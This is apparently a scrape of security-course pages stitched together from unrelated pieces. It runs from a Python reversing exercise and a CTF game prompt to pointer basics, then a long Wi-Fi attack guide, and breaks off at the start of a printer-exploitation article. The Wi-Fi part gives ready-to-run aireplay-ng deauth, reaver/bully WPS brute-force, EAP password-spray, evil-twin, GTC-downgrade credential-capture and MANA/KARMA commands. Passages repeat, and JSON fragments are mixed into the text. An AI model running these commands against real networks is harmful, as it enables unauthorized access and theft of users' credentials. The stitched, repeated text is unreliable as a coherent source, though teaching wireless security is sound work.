printed with \"%c\", we can determine it represents the 'Hello, World!' string. Lets define all these variables in our Python main function: def main(): string = \"Hello, World!\" i = 0 v4 = 0 for i in range(0, 13): v4 = i + 1 print(string[i], end='') while v4 < 13: print(string[v4], end='') v4 += 1 print() printSpacer(13-i) printSpacer Function Now we can see that printSpacer is clearly being fed an int value. Translating it into python shouldn't be too hard. def printSpacer(number): i = 0 for i in range(0, number): print(\"-\", end='') print() Results Running main() gives us: Hello, World! ------------- ello, World! ------------ llo, World! ----------- lo, World! ---------- o, World! --------- , World! -------- World! ------- World! ------ orld! ----- rld! ---- ld! --- d! -- ! - Exercise (4 pt) De-Android Android source code is easy to de-compile.

As a kind of STG game, Touhou Project is very difficult and not friendly for beginners. Some one sent me this game and challenged me: if you can pass all 6 levels in Lunatic difficulty, you can have the flag. Each time you finish a level in Lunatic difficulty, one part of flag is given to flag.txt under the game directory. I have several ideas for you to break this game: As a real touhou player, you can play this game until you finish all levels. As a reverse engineer, you may observe the assembly codes and find how flag is given after each level. As a game trainer developer, you also can write a cheat for this game. As a social engineer, you can convince CS315's professor and TAs to tell you the flag.

To understand this idea we should first understand that memory is laid out in terms of addresses and data gets stored at these addresses. Take the following example of defining an integer in C: int x = 4; To the programmer this is the variable x receiving the value of 4. The computer stores this value in some location in memory. For example we can say that address 0x1000 now holds the value 4 . The computer knows to directly access the memory and retrieve the value 4 whenever the programmer tries to use the x variable. If we were to say x + 4 , the computer would give you 8 instead of 0x1004 . But in C we can retrieve the memory address being used to hold the 4 value (i.e. 0x1000) by using the & character and using * to create an \"integer pointer\" type. int* y = &x; The y variable will store the address pointed to by the x variable (0x1000). The * character allows us to declare pointer variables but also allows us to access the value stored at a pointer. For example, entering *y allows us to access the 4 value instead of 0x1000.

These are a type of \"management\" frame responsible for disconnecting a device from an access point. Forging these packets is the key to hacking many Wi-Fi networks , as you can forcibly disconnect any client from the network at any time. The ease of which this can be done is somewhat frightening and is often done as part of gathering a WPA handshake for cracking. Aside from momentarily using this disconnection to harvest a handshake to crack, you can also just let those deauths keep coming, which has the effect of peppering the client with deauth packets seemingly from the network they are connected to. Because these frames aren't encrypted, many programs take advantage of management frames by forging them and sending them to either one or all devices on a network. Description from here . Deauthentication using Aireplay-ng aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0 -0 means deauthentication 1 is the number of deauths to send (you can send multiple if you wish); 0 means send them continuously -a 00:14:6C:7E:40:80 is the MAC address of the access point -c 00:0F:B5:34:30:30 is the MAC address of the client to deauthenticate; if this is omitted then broadcast deauthentication is sent (not always work) ath0 is the interface name Disassociation Packets Disassociation packets are another type of management frame that is used to disconnect a node (meaning any device like a laptop or cell phone) from a nearby access point. The difference between deauthentication and disassociation frames is primarily the way they are used. An AP looking to disconnect a rogue device would send a deauthentication packet to inform the device it has been disconnected from the network, whereas a disassociation packet is used to disconnect any nodes when the AP is powering down, rebooting, or leaving the area.

Be careful! Airggedon Airgeddon offers most of the attacks proposed in the previous comments: WPS WPS stands for Wi-Fi Protected Setup. It is a wireless network security standard that tries to make connections between a router and wireless devices faster and easier. WPS works only for wireless networks that use a password that is encrypted with the WPA Personal or WPA2 Personal security protocols. WPS doesn't work on wireless networks that are using the deprecated WEP security, which can be cracked easily by any hacker with a basic set of tools and skills. (From here ) WPS uses a 8 length PIN to allow a user to connect to the network, but it's first checked the first 4 numbers and, if correct, then is checked the second 4 numbers. Then, it is possible to Brute-Force the first half and then the second half (only 11000 possibilities). WPS Bruteforce There are 2 main tools to perform this action: Reaver and Bully. Reaver has been designed to be a robust and practical attack against WPS, and has been tested against a wide variety of access points and WPS implementations. Bully is a new implementation of the WPS brute force attack, written in C. It has several advantages over the original reaver code: fewer dependencies, improved memory and cpu performance, correct handling of endianness, and a more robust set of options. It runs on Linux, and was specifically developed to run on embedded Linux systems (OpenWrt, etc) regardless of architecture. Bully provides several improvements in the detection and handling of anomalous scenarios. It has been tested against access points from numerous vendors, and with differing configurations, with much success. If the WPS valid code is found, both Bully and Reaver will use it to discover the WPA/WPA2 PSK used to protect the network, so you will be able to connect anytime you need it. reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3 Smart Brute force Instead of starting trying every possible PIN, you should check if there are available PINs discoveredfor the AP you are attacking (depending of the manufacturer MAC) and the PIN software generated PINs . The database of known PINs is made for Access Points of certain manufacturers for which it is known that they use the same WPS PINs. This database contains the first three octets of MAC-addresses and a list of corresponding PINs that are very likely for this manufacturer. There are several algorithms for generating WPS PINs. For example, ComputePIN and EasyBox use the MAC-address of the Access Point in their calculations. But the Arcadyan algorithm also requires a device ID. WPS Pixie Dust attack Dominique Bongard discovered that some APs have weak ways of generating nonces (known as E-S1 and E-S2 ) that are supposed to be secret. If we are able to figure out what these nonces are, we can easily find the WPS PIN of an AP since the AP must give it to us in a hash in order to prove that it also knowns the PIN, and the client is not connecting to a rouge AP. These E-S1 and E-S2 are essentially the \"keys to unlock the lock box\" containing the WPS pin. More info here: https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack) Basically, some implementations failed in the use of random keys to encrypt the 2 parts of the the PIN(as it is discomposed in 2 parts during the authentication communication and sent to the client), so an offline attack could be used to brute force the valid PIN. reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv bully wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3 Null Pin attack Some really bad implementations allowed the Null PIN to connect (very weird also). Reaver can test this (Bully cannot). reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p '' Airgeddon All the proposed WPS attacks can be easily performed using *airgeddon.* 5 and 6 lets you try your custom PIN (if you have any) 7 and 8 perform the Pixie Dust attack 13 allows you to test the NULL PIN 11 and 12 will recollect the PINs related to the selected AP from available databases and generate possible PINs using: ComputePIN, EasyBox and optionally Arcadyan (recommended, why not?) 9 and 10 will test every possible PIN WEP So broken and disappeared that I am not going to talk about it. Just know that *airgeddon* have a WEP option called \"All-in-One\" to attack this kind of protection. More tools offer similar options. WPA/WPA2 PSK PMKID In 2018 hashcat authors disclosed a new type of attack which not only relies on one single packet , but it doesn\u2019t require any clients to be connected to our target AP or, if clients are connected, it doesn\u2019t require us to send deauth frames to them, there\u2019s no interaction between the attacker and client stations, but just between the attacker and the AP, interaction which, if the router is vulnerable, is almost immediate! It turns out that a lot of modern routers append an optional field at the end of the first EAPOL frame sent by the AP itself when someone is associating, the so called Robust Security Network , which includes something called PMKID As explained in the original post, the PMKID is derived by using data which is known to us: PMKID = HMAC-SHA1-128(PMK, \"PMK Name\" | MAC_AP | MAC_STA) Since the \u201cPMK Name\u201d string is constant, we know both the BSSID of the AP and the station and the PMK is the same one obtained from a full 4-way handshake , this is all hashcat needs in order to crack the PSK and recover the passphrase! Description obtained from here .

I would recommend to capture handshakes also via traditional way if possible, or capture several of them using this tool. Handshake capture One way to attack WPA/WPA2 networks is to capture a handshake and try to crack the used password offline . To do so you need to find the BSSID and channel of the victim network, and a client that is connected to the network. Once you have that information you have to start listening to all the commutation of that BSSID in that channel , because hopefully the handshake will be send there: airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap Now you need to deauthenticate the client for a few seconds so it will automatically authenticate again to the AP (please read the part of DoS to find several ways to deauthenticate a client): aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, not always work Note that as the client was deauthenticated it could try to connect to a different AP or, in other cases, to a different network.

For this kind of Wifis you will probably find in airodump-ng something like this: 6A:FE:3B:73:18:FB -58 19 0 0 1 195 WPA2 CCMP MGT NameOfMyWifi EAP (Extensible Authentication Protocol) the skull of the authentication communication , on top of this, an authentication algorithm is used by the server to authenticate the client ( supplicant ) and in same cases by the client to authenticate the server. Main authentication algorithms used in this case: EAP-GTC: Is an EAP method to support the use of hardware tokens and one-time passwords with EAP-PEAP. Its implementation is similar to MSCHAPv2, but does not use a peer challenge. Instead, passwords are sent to the access point in plaintext (very interesting for downgrade attacks). EAP-MD-5 (Message Digest) : The client send the MD5 hash of the password. Not recommended : Vulnrable to dictionary attacks, no server authentication and no way to generate per session wired equivalent privacy (WEP) keys. EAP-TLS (Transport Layer Security) : It relies on client-side and server-side certificates to perform authentication and can be used to dynamically generate user-based and session-based WEP keys to secure subsequent communications. EAP-TTLS (Tunneled Transport Layer Security) : Mutual authentication of the client and network through an encrypted channel (or tunnel), as well as a means to derive dynamic, per-user, per-session WEP keys. Unlike EAP-TLS, EAP-TTLS requires only server-side certificates (client will use credentials) . PEAP (Protected Extensible Authentication Protocol) : PEAP is like the EAP protocol but creating a TLS tunnel to protect the communication. Then, weak authentication protocols can by used on top of EAP as they will be protected by the tunnel. PEAP-MSCHAPv2 : This is also known as just PEAP because it is widely adopted. This is just the vulnerable challenge/response called MSCHAPv2 on to of PEAP (it is protected by the TLS tunnel). PEAP-EAP-TLS or just PEAP-TLS : Is very similar to EAP-TLS but a TLS tunnel is created before the certificates are exchanged. You can find more information about these authentication methods here and here . Username Capture Reading https://tools.ietf.org/html/rfc3748#page-27 it looks like if you are using EAP the \"Identity\" messages must be supported , and the username is going to be sent in clear in the \"Response Identity\" messages. Even using one of the most secure of authentication methods: PEAP-EAP-TLS , it is possible to capture the username sent in the EAP protocol . To do so, capture a authentication communication (start airodump-ng inside a channel and wireshark in the same interface) and filter the packets by eapol . Inside the \" Response, Identity \" packet, the username of the client will appear. Anonymous Identities (Info taken from https://www.interlinknetworks.com/app_notes/eap-peap.htm) Both EAP-PEAP and EAP-TTLS support identity hiding . In a WiFi environment, the access point (AP) typically generates an EAP-Identity request as part of the association process. To preserve anonymity, the EAP client on the user\u2019s system may respond with only enough information to allow the first hop RADIUS server to process the request, as shown in the following examples. EAP-Identity = anonymous In this example, all users will share the pseudo-user-name \u201canonymous\u201d. The first hop RADIUS server is an EAP-PEAP or EAP-TTLS server which drives the server end of the PEAP or TTLS protocol. The inner (protected) authentication type will then be either handled locally or proxied to a remote (home) RADIUS server. EAP-Identity = anonymous@realm_x In this example, users belonging to different realms hide their own identity but indicate which realm they belong to so that the first hop RADIUS server may proxy the EAP-PEAP or EAP-TTLS requests to RADIUS servers in their home realms which will act as the PEAP or TTLS server. The first hop server acts purely as a RADIUS relay node. Alternatively, the first hop server may act as the EAP-PEAP or EAP-TTLS server and either process the protected authentication method or proxy it to another server. This option may be used to configure different policies for different realms. In EAP-PEAP, once the PEAP server and the PEAP client establish the TLS tunnel, the PEAP server generates an EAP-Identity request and transmits it down the TLS tunnel. The client responds to this second EAP-Identity request by sending an EAP-Identity response containing the user\u2019s true identity down the encrypted tunnel. This prevents anyone eavesdropping on the 802.11 traffic from discovering the user\u2019s true identity. EAP-TTLS works slightly differently. With EAP-TTLS, the client typically authenticates via PAP or CHAP protected by the TLS tunnel. In this case, the client will include a User-Name attribute and either a Password or CHAP-Password attribute in the first TLS message sent after the tunnel is established. With either protocol, the PEAP/TTLS server learns the user\u2019s true identity once the TLS tunnel has been established. The true identity may be either in the form user@realm or simply user* *. If the PEAP/TTLS server is also authenticating the user **, it now knows the user\u2019s identity and proceeds with the authentication method being protected by the TLS tunnel. Alternatively, the PEAP/TTLS server may forward a new RADIUS request to the user\u2019s home RADIUS server. This new RADIUS request has the PEAP or TTLS protocol stripped out. If the protected authentication method is EAP, the inner EAP messages are transmitted to the home RADIUS server without the EAP-PEAP or EAP-TTLS wrapper. The User-Name attribute of the outgoing RADIUS message contains the user\u2019s true identity \u2013 not the anonymous identity from the User-Name attribute of the incoming RADIUS request. If the protected authentication method is PAP or CHAP (supported only by TTLS), the User-Name and other authentication attributes recovered from the TLS payload are placed in the outgoing RADIUS message in place of the anonymous User-Name and TTLS EAP-Message attributes included in the incoming RADIUS request. EAP-Bruteforce (password spray) If the client is expected to use a username and password (notice that EAP-TLS won't be valid in this case), then you could try to get a list a usernames (see next part) and passwords and try to bruteforce the access using air-hammer . ./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt You could also do this attack using eaphammer : ./eaphammer --eap-spray \\ --interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \\ --essid example-wifi \\ --password bananas \\ --user-list users.txt Client attacks Theory Network Selection and Roaming Although the 802.11 protocol has very specific rules that dictate how a station can join an ESS, it does not specify how the station should select an ESS to connect to. Additionally, the protocol allows stations to roam freely between access points that share the same ESSID (because you wouldn\u2019t want to lose WiFi connectivity when walking from one end of a building to another, etc). However, the 802.11 protocol does not specify how these access points should be selected. Furthermore, even though stations must be authenticated to the ESS in order to associate with an access point, the 802.11 protocol does not require the access point be authenticated to the station. Preferred Network Lists (PNLs) Each time a station connects to a wireless network, the network\u2019s ESSID is stored in the station\u2019s Preferred Network List (PNL). The PNL is an ordered list of every network that the station has connected to in the past, and each entry in the PNL contains the network\u2019s ESSID and any network-specific configuration information needed to establish a connection. Passive Scanning In infrastructure networks, access points periodically transmit beacon frames to advertise their presence and capabilities to nearby stations. Beacons are broadcast frames, which means they are intended to be received by all nearby stations in range. Beacons include information about the AP\u2019s supported rates, encryption capabilities, additional information, and most importantly, beacon frames contain the AP\u2019s ESSID (as long as ESSID broadcasting is not disabled). During passive scanning, the client device listens for beacon frames from nearby access points. If the client device receives a beacon frame whose ESSID field matches an ESSID from the client\u2019s PNL, the client will automatically connect to the access point that sent the beacon frame. Then, suppose we want to target a wireless device that is not currently connected to any wireless. If we know at least one entry in that client\u2019s PNL, we can force the client to connect to us simply by creating our own access point with that entry\u2019s ESSID. Active Probing The second network selection algorithm used in 802.11 is known as Active Probing. Client devices that use active probing continuously transmit probe request frames to determine what APs are within range, as well as what their capabilities are. Probe requests come in two forms: directed and broadcast. Directed probe requests are addressed to a specific ESSID, and are the client\u2019s way of checking if a specific network is nearby. Clients that use directed probing will send out probe requests for each network in its PNL. It should be noted that directed probing is the only way of identify the presence of nearby hidden networks. Broadcast probe requests work almost exactly the same way, but are sent with the SSID field set to NULL. This addresses the broadcast probe to all nearby access points, allowing the the station to check if any of its preferred networks are nearby without revealing the contents of its PNL Simple AP with redirection to Internet Before explaining how to perform more complex attacks it's going to be explained how to just create an AP and redirect it's traffic to an interface connected to the Internet . Using ifconfig -a check that the wlan interface to create the AP and the interface connected to the Internet are present. DHCP & DNS apt-get install dnsmasq #Manages DHCP and DNS create a config file /etc/dnsmasq.conf as follows: interface=wlan0 dhcp-authoritative dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h dhcp-option=3,192.168.1.1 dhcp-option=6,192.168.1.1 server=8.8.8.8 log-queries log-dhcp listen-address=127.0.0.1 Then set IPs and routes : ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0 route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1 And then start dnsmasq: dnsmasq -C dnsmasq.conf -d hostapd apt-get install hostapd Create a config file hostapd.conf: interface=wlan0 driver=nl80211 ssid=MITIWIFI hw_mode=g channel=11 macaddr_acl=0 ignore_broadcast_ssid=0 auth_algs=1 wpa=2 wpa_passphrase=mitmwifi123 wpa_key_mgmt=WPA-PSK wpa_pairwise=CCMP wpa_group_rekey=86400 ieee80211n=1 wme_enabled=1 Stop annoying processes , set monitor mode , and start hostapd : airmon-ng check kill iwconfig wlan0 mode monitor ifconfig wlan0 up hostapd ./hostapd.conf Forwarding and Redirection iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE iptables --append FORWARD --in-interface wlan0 -j ACCEPT echo 1 > /proc/sys/net/ipv4/ip_forward Evil Twin An evil twin attack is a type Wi-Fi attack that works by taking advantage of the fact that most computers and phones will only see the \"name\" or ESSID of a wireless network (as the base station is not required to authenticate against the client). This actually makes it very hard to distinguish between networks with the same name and same kind of encryption. In fact, many networks will have several network-extending access points all using the same name to expand access without confusing users. Due how the implementation of clients work (remember that the 802.11 protocol allows stations to roam freely between access points within the same ESS), it is possible to make a device to change the base station it is connected to. It is possible to do that offering a better signal (which is not always possible) or by blocking the access to the original base station (deauthentication packets, jamming, or some other form of DoS attack). Notice also that real-world wireless deployments usually have more than a single access point, and these access points are often more powerful and have better line-of-site range due to their placement towards the ceiling. Deauthenticating a single access point usually results in the target roaming towards another valid access point rather than your rogue AP, unless all nearby access points are deauthenticated (loud) or you are very careful with the placement of the rogue AP (difficult). You can create a very basic Open Evil Twin (no capabilities to route traffic to Internet) doing: airbase-ng -a 00:09:5B:6F:64:1E --essid \"Elroy\" -c 1 wlan0mon You could also create an Evil Twin using eaphammer (notice that to create evil twins with eaphammer the interface should NOT be in monitor mode): ./eaphammer -i wlan0 --essid exampleCorp --captive-portal Or using Airgeddon: Options: 5,6,7,8,9 (inside Evil Twin attack menu). Please, notice that by default if an ESSID in the PNL is saved as WPA protected, the device won't connect automatically to an Open evil Twin. You can try to DoS the real AP and hope that the user will connect manually to your Open evil twin, or you could DoS the real AP an use a WPA Evil Twin to capture the handshake (using this method you won't be able to let the victim connect to you as you don't know the PSK, but you can capture the handshake and try to crack it). Some OS and AV will warn the user that connect to an Open network is dangerous... WPA/WPA2 Evil Twin You can create an Evil Twin using WPA/2 and if the devices have configured to connect to that SSID with WPA/2, they are going to try to connect. Anyway, to complete the 4-way-handshake you also need to know the password that the client is going to use. If you don't know it, the connection won't be completed . ./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase \"mywifipassword\" Enterprise Evil Twin To understand this attacks I would recommend to read before the brief WPA Enterprise explanation . Using hostapd-wpe hostapd-wpe needs a configuration file to work. To automate the generation if these configurations you could use https://github.com/WJDigby/apd_launchpad (download the python file inside /etc/hostapd-wpe/ ) ./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com hostapd-wpe ./victim/victim.conf -s In the configuration file you can select a lot of different things like ssid, channel, user files, cret/key, dh parameters, wpa version and auth... Using hostapd-wpe with EAP-TLS to allow any certificate to login. Using EAPHammer # Generate Certificates./eaphammer --cert-wizard # Launch Attack./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds By default, EAPHammer purposes this authentication methods (notice GTC as the first one to try to obtain plaintext passwords and then the use of more robust auth methods): GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5 This is the default methodology to avoid long connection times. However, you can also specify to server the authentication methods from weakest to strongest: --negotiate weakest Or you could also use: --negotiate gtc-downgrade to use highly efficient GTC downgrade implementation (plaintext passwords) --negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP to specify manually the methods offered (offering the same auth methods in the same order as the organisation the attack will be much more difficult to detect). Find more info in the wiki Using Airgeddon Airgeddon can use previously generated certificated to offer EAP authentication to WPA/WPA2-Enterprise networks. The fake network will downgrade the connection protocol to EAP-MD5 so it will be able to capture the user and the MD5 of the password . Later, the attacker can try to crack the password. Airggedon offers you the possibility of a continuous Evil Twin attack (noisy) or only create the Evil Attack until someone connects (smooth). Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks This method was tested in an PEAP connection but as I'm decrypting an arbitrary TLS tunnel this should also works with EAP-TTLS Inside the configuration of hostapd-wpe comment the line that contains dh_file* * (from dh_file=/etc/hostapd-wpe/certs/dh to #dh_file=/etc/hostapd-wpe/certs/dh ) This will make hostapd-wpe to exchange keys using RSA instead of DH, so you will be able to decrypt the traffic later knowing the servers private key**. Now start the Evil Twin using hostapd-wpe with that modified configuration as usual. Also, start wireshark in the interface which is performing the Evil Twin attack. Now or later (when you have already captured some authentication intents) you can add the private RSA key to wireshark in: Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit... Add a new entry and fill the form with this values: IP address = any -- Port = 0 -- Protocol = data -- Key File ( select your key file , to avoid problems select a key file without being password protected ). And look at the new \"Decrypted TLS\" tab : KARMA, MANA, Loud MANA and Known beacons attack ESSID and MAC black/whitelists The following table lists the different type of MFACLs (Management Frame Access Control Lists) available, as well their effects when used: # example EAPHammer MFACL file, wildcards can be used78:f0:97:fc:b5:369a:35:e1:01:4f:cf69:19:14:60:20:45ce:52:b8:*:*:* [--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting][--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting] # example ESSID-based MFACL fileapplesorangesgrapespears [--ssid-whitelist /path/to/mac/whitelist/file.txt][--ssid-blacklist /path/to/mac/blacklist/file.txt] KARMA Karma attacks are a second form of rogue access point attack that exploits the network selection process used by stations. In a whitepaper written in 2005, Dino Dai Zovi and Shane Macaulay describe how an attacker can configure an access point to listen for directed probe requests and respond to all of them with matching directed probe responses. This causes the affected stations to automatically send an association request to the attacker\u2019s access point. The access point then replies with an association response, causing the affected stations to connect to the attacker. MANA According to Ian de Villiers and Dominic White, modern stations are designed to protect themselves against karma attacks by ignoring directed probe responses from access points that have not already responded to at least one broadcast probe request. This led to a significant drop in the number of stations that were vulnerable to karma attacks until 2015, when White and de Villiers developed a means of circumventing such protections. In White\u2019s and de Villiers\u2019 improved karma attack (MANA attack), directed probe responses are used to reconstruct the PNLs of nearby stations. When a broadcast probe request is received from a station, the attacker\u2019s access point responds with an arbitrary SSID from the station\u2019s PNL already being saw in a direct probe from that device. In resume, the MANA algorithm works like this: each time the access point receives a probe request, it first determines whether it\u2019s a broadcast or directed probe. If it\u2019s directed probe, the sender\u2019s MAC address is added to the hash table (if it\u2019s not there already) and the ESSID is added to that device\u2019s PNL. The AP then responds with a directed probe response. If it\u2019s a broadcast probe, the access point responds with probe responses for each of the networks in that device\u2019s PNL. MANA attack using eaphammer: ./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds] Loud MANA Notice that the standard MANA attack still does not allow us to attack devices that don\u2019t use directed probing at all. So if we also doesn't know previously any entry inside the device PNL, we need to figure out some other way to attack it. A possibility is what is called Loud MANA attack. This attack relies on the idea that client devices within close physical proximity to one another are likely to have at least some common entries in their PNLs. In resume, Loud MANA attack instead of responding to probe requests with each ESSID in a particular device\u2019s PNL, the rogue AP sends probe responses for every ESSID in every PNL across all devices that it has seen before. Relating this to set theory, we can say that the AP sends probe responses for each ESSID in the union of all PNLs of nearby devices. ./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds] Known Beacon attack There are still cases in which Loud MANA attack won\u2019t succeed. The Known Beacon attack is a way to \"Brute-Force\" ESSIDs to try to get the victim connect to the attacker. The attacker creates an AP that response to any ESSID and run some code sending beacons faking ESSIDs of each name inside a wordlist. Hopefully the victim will contains some of theses ESSID names inside its PNL and will try to connect to the fake AP. Eaphammer implemented this attack as a MANA attack where all the ESSIDs inside a list are charged (you could also combine this with --loud to create a Loud MANA + Known beacons attack): ./eaphammer -i wlan0 --mana [--loud] --known-beacons --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds] Known Beacon Burst attack As known beacons are loud. You can use a script inside Eaphammer project to just launch beacouns of every ESSID name inside a file very quickly. If you combines this script with a Eaphammer MANA attack, the clients will be able to connect to your AP. # transmit a burst of 5 forged beacon packets for each entry in list ./forge-beacons -i wlan1 \\ --bssid de:ad:be:ef:13:37 \\ --known-essids-file known-s.txt \\ --dst-addr 11:22:33:11:22:33 \\ --burst-count 5 Other tools Wifite2 This tool automates WPS/WEP/WPA-PSK attacks.

These are a type of \"management\" frame responsible for disconnecting a device from an access point. Forging these packets is the key to hacking many Wi-Fi networks , as you can forcibly disconnect any client from the network at any time. The ease of which this can be done is somewhat frightening and is often done as part of gathering a WPA handshake for cracking.

EAP-MD-5 (Message Digest) : The client send the MD5 hash of the password. Not recommended : Vulnrable to dictionary attacks, no server authentication and no way to generate per session wired equivalent privacy (WEP) keys. EAP-TLS (Transport Layer Security) : It relies on client-side and server-side certificates to perform authentication and can be used to dynamically generate user-based and session-based WEP keys to secure subsequent communications. EAP-TTLS (Tunneled Transport Layer Security) : Mutual authentication of the client and network through an encrypted channel (or tunnel), as well as a means to derive dynamic, per-user, per-session WEP keys. Unlike EAP-TLS, EAP-TTLS requires only server-side certificates (client will use credentials) . PEAP (Protected Extensible Authentication Protocol) : PEAP is like the EAP protocol but creating a TLS tunnel to protect the communication. Then, weak authentication protocols can by used on top of EAP as they will be protected by the tunnel. PEAP-MSCHAPv2 : This is also known as just PEAP because it is widely adopted.

In a WiFi environment, the access point (AP) typically generates an EAP-Identity request as part of the association process. To preserve anonymity, the EAP client on the user\u2019s system may respond with only enough information to allow the first hop RADIUS server to process the request, as shown in the following examples. EAP-Identity = anonymous In this example, all users will share the pseudo-user-name \u201canonymous\u201d. The first hop RADIUS server is an EAP-PEAP or EAP-TTLS server which drives the server end of the PEAP or TTLS protocol. The inner (protected) authentication type will then be either handled locally or proxied to a remote (home) RADIUS server. EAP-Identity = anonymous@realm_x In this example, users belonging to different realms hide their own identity but indicate which realm they belong to so that the first hop RADIUS server may proxy the EAP-PEAP or EAP-TTLS requests to RADIUS servers in their home realms which will act as the PEAP or TTLS server. The first hop server acts purely as a RADIUS relay node. Alternatively, the first hop server may act as the EAP-PEAP or EAP-TTLS server and either process the protected authentication method or proxy it to another server. This option may be used to configure different policies for different realms. In EAP-PEAP, once the PEAP server and the PEAP client establish the TLS tunnel, the PEAP server generates an EAP-Identity request and transmits it down the TLS tunnel. The client responds to this second EAP-Identity request by sending an EAP-Identity response containing the user\u2019s true identity down the encrypted tunnel. This prevents anyone eavesdropping on the 802.11 traffic from discovering the user\u2019s true identity. EAP-TTLS works slightly differently. With EAP-TTLS, the client typically authenticates via PAP or CHAP protected by the TLS tunnel. In this case, the client will include a User-Name attribute and either a Password or CHAP-Password attribute in the first TLS message sent after the tunnel is established. With either protocol, the PEAP/TTLS server learns the user\u2019s true identity once the TLS tunnel has been established. The true identity may be either in the form user@realm or simply user* *. If the PEAP/TTLS server is also authenticating the user **, it now knows the user\u2019s identity and proceeds with the authentication method being protected by the TLS tunnel. Alternatively, the PEAP/TTLS server may forward a new RADIUS request to the user\u2019s home RADIUS server. This new RADIUS request has the PEAP or TTLS protocol stripped out. If the protected authentication method is EAP, the inner EAP messages are transmitted to the home RADIUS server without the EAP-PEAP or EAP-TTLS wrapper. The User-Name attribute of the outgoing RADIUS message contains the user\u2019s true identity \u2013 not the anonymous identity from the User-Name attribute of the incoming RADIUS request. If the protected authentication method is PAP or CHAP (supported only by TTLS), the User-Name and other authentication attributes recovered from the TLS payload are placed in the outgoing RADIUS message in place of the anonymous User-Name and TTLS EAP-Message attributes included in the incoming RADIUS request.","title":"Anonymous Identities"},{"location":"CS315/Week%207/#eap-bruteforce-password-spray","text":"If the client is expected to use a username and password (notice that EAP-TLS won't be valid in this case), then you could try to get a list a usernames (see next part) and passwords and try to bruteforce the access using air-hammer . ./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt You could also do this attack using eaphammer : ./eaphammer --eap-spray \\ --interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \\ --essid example-wifi \\ --password bananas \\ --user-list users.txt","title":"EAP-Bruteforce (password spray)"},{"location":"CS315/Week%207/#client-attacks-theory","text":"","title":"Client attacks Theory"},{"location":"CS315/Week%207/#network-selection-and-roaming","text":"Although the 802.11 protocol has very specific rules that dictate how a station can join an ESS, it does not specify how the station should select an ESS to connect to.

In fact, many networks will have several network-extending access points all using the same name to expand access without confusing users.

It is possible to do that offering a better signal (which is not always possible) or by blocking the access to the original base station (deauthentication packets, jamming, or some other form of DoS attack). Notice also that real-world wireless deployments usually have more than a single access point, and these access points are often more powerful and have better line-of-site range due to their placement towards the ceiling.

This led to a significant drop in the number of stations that were vulnerable to karma attacks until 2015, when White and de Villiers developed a means of circumventing such protections. In White\u2019s and de Villiers\u2019 improved karma attack (MANA attack), directed probe responses are used to reconstruct the PNLs of nearby stations. When a broadcast probe request is received from a station, the attacker\u2019s access point responds with an arbitrary SSID from the station\u2019s PNL already being saw in a direct probe from that device. In resume, the MANA algorithm works like this: each time the access point receives a probe request, it first determines whether it\u2019s a broadcast or directed probe. If it\u2019s directed probe, the sender\u2019s MAC address is added to the hash table (if it\u2019s not there already) and the ESSID is added to that device\u2019s PNL. The AP then responds with a directed probe response. If it\u2019s a broadcast probe, the access point responds with probe responses for each of the networks in that device\u2019s PNL.

An Introduction to Printer Exploitation Preface Note: As always the following is just a digest of all the things I could observe by working on printers myself or facts from stuff I read about recently. Since this thread about the HP printer promo videos 3 caught some attention I will try to shed some light onto the field which was displayed there. First of all we should keep in mind this was a promo video made by a company. So always ask yourself this: \u201cHow real are the displayed scenarios, or are these just \u2018Hollywood fabrications\u2019?\u201d I had some access to different printers over the last couple of month and learned some basic principles, which I wanna share with you as good as possible now. Printer use a various amount of protocols and firmwares which differ from vendor to vendor and model to model. So this first part might be boring to some, you can try to skip the theoretical part and jump right to the exploitation paragraph, but talking about fundamentals will cover important topics. Printer as an attack vector? So why would I even want to target a printer in the first place? Why not just target Desktop or Server environments with malware as usual? We get to that in next couple of paragraphs Required Skills Not much to mention here basic ability to read for more than 5 minutes Printer a viable target or just wasted time? Local vs Network printers Local printers are just directly connected to a desktop PC and are rather uninteresting. These days almost all printers seem to be network printers though. So basically network printing enables users in locations geographically separate from each other and from their print devices to produce documents for themselves and others. Print servers enable multiple clients to share one or more print devices. So far so easy right? Let\u2019s jump directly to some highlevel view which explains every network printer quite well. Highlevel view A highlevel view of current network printers might look something like this: +----------------------------------------------------+ | Network printing protocols | Printing channel +-------------------------------+--+ | | | IPP, LPD, SMB, raw port 9100 | | | +--------------------------------------------------+ | | job/printer control langs. | | Printer language 